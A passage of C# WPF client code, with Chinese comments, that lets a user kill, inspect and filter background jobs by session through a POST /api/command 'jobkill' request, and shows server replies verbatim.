            foreach (string line in Codec.Clean(text).Split('\n'))
            {
                JobMsg.AppendText("[" + DateTime.Now.ToString("HH:mm:ss") + "] " + line + "\n");
                _jobMsgLines++;
            }
            JobMsg.ScrollToEnd();
            JobOutTitle.Text = "jobkill 输出 " + _jobMsgLines + " 行";
        }

        private static string FirstLine(string s)
        {
            string t = Codec.Clean(s ?? "");
            int cut = t.IndexOf('\n');
            return cut >= 0 ? t.Substring(0, cut) : t;
        }

        private async void JobKill_Click(object sender, RoutedEventArgs e)
        {
            await KillJobAsync(GridJobs.SelectedItem as JobRow);
        }

        private async void JobCtxKill_Click(object sender, RoutedEventArgs e)
        {
            await KillJobAsync(GridJobs.SelectedItem as JobRow);
        }

        private async void JobRowKill_Click(object sender, RoutedEventArgs e)
        {
            var fe = sender as FrameworkElement;
            var row = fe == null ? null : fe.DataContext as JobRow;
            if (row != null) GridJobs.SelectedItem = row;
            await KillJobAsync(row);
        }

        /// <summary>
        /// 终止一个作业: POST /api/command {"sid": 该作业的 sid, "cmd": "jobkill &lt;id&gt;"}。
        /// 服务端 text **原样**进输出区; killable=false 时服务端回的那句"无法中途终止"
        /// 按成功路径照原样显示 (只换一种语气提示, 绝不渲染成失败)。
        /// </summary>
        private async Task KillJobAsync(JobRow row)
        {
            if (row == null) { SetStatus("请先在作业表中选择一条作业"); return; }
            if (row.Sid.Length == 0)
            {
                SetStatus("job " + row.Id + " 没有 sid 字段, 无法定位会话 —— 未下发");
                return;
            }

            string cmd = JobParse.KillCommand(row.Id);
            JobWrite("> POST /api/command {\"sid\":\"" + row.Sid + "\",\"cmd\":\"" + cmd + "\"}");
            try
            {
                using (var doc = await _api.SendCommandAsync(row.Sid, cmd))
                {
                    var root = doc.RootElement;
                    bool ok = root.Bool("ok");
                    string text = JobParse.KillResultText(ok, root.Str("text"), root.Str("error"), row.Id);
                    JobWrite(text);                       // 服务端回话原样 (含"无法中途终止")

                    if (!ok)
                    {
                        SetStatus("jobkill " + row.Id + " 服务端返回 ok=false: " + FirstLine(text));
                    }
                    else
                    {
                        // killable=false 的作业回的是 ok=true + "是一次性任务, 无法中途终止: ...":
                        // 这是如实行为, 走成功路径原样显示, 绝不改写成失败。
                        SetStatus("jobkill " + row.Id + ": " + FirstLine(text));
                        if (JobParse.IsNotKillableText(text))
                        {
                            // 原话单独占一行未被改写; 这里只补一句界面注释, 免得被误读成失败
                            JobWrite("(以上为服务端如实回报: 该作业不可中途终止, 状态未变更; 不是请求失败)");
                        }
                    }
                }
                await PollAsync();      // 立刻刷新, 不等下一个 tick
            }
            catch (Exception ex)
            {
                JobWrite("请求失败: " + ex.Message);
                SetStatus("jobkill " + row.Id + " 请求失败: " + ex.Message);
            }
        }

        private void JobCtxCopyInfo_Click(object sender, RoutedEventArgs e)
        {
            var row = GridJobs.SelectedItem as JobRow;
            if (row == null) { SetStatus("请先在作业表中选择一条作业"); return; }

            var sb = new StringBuilder();
            sb.AppendLine("id       : " + row.Id);
            sb.AppendLine("sid      : " + row.Sid);
            sb.AppendLine("kind     : " + row.Kind);
            sb.AppendLine("detail   : " + row.DetailText);
            sb.AppendLine("status   : " + row.StatusText);
            sb.AppendLine("killable : " + (row.Killable ? "true (有停止通道)" : "false (一次性任务, 不可中途终止)"));
            sb.AppendLine("started  : " + row.StartedText);
            sb.AppendLine("ended    : " + row.EndedText);
            sb.AppendLine("elapsed  : " + row.ElapsedText);
            sb.AppendLine("port     : " + row.PortText);
            sb.AppendLine("task_id  : " + row.TaskText);
            sb.AppendLine("note     : " + row.NoteText);
            sb.AppendLine("jobkill  : " + JobParse.KillCommand(row.Id) + "   (sid " + row.Sid + ")");
            CopyToClipboard(sb.ToString(), "作业信息");
        }

        /// <summary>把会话过滤器切到该行所属会话 (纯客户端过滤)。</summary>
        private void JobCtxOnlySid_Click(object sender, RoutedEventArgs e)
        {
            var row = GridJobs.SelectedItem as JobRow;
            if (row == null) { SetStatus("请先在作业表中选择一条作业"); return; }

            var items = JobSidBox.ItemsSource as List<JobSidItem>;
            JobSidItem hit = JobParse.PickSid(items, "sid:" + row.Sid);
            if (hit == null || !string.Equals(hit.Key, "sid:" + row.Sid, StringComparison.Ordinal))
            {
                // 该会话已不在下拉里 (会话下线后 items 会少一项): 不静默改成"全部会话"
                SetStatus("会话 " + row.Sid + " 不在会话下拉里 (可能已下线), 未改变过滤条件");
                return;
            }
            JobSidBox.SelectedItem = hit;
            ApplyJobRows();
            SetStatus("作业过滤: 只看会话 " + row.Sid + " (" + _jobs.Count + " 个)");
        }
    }
}
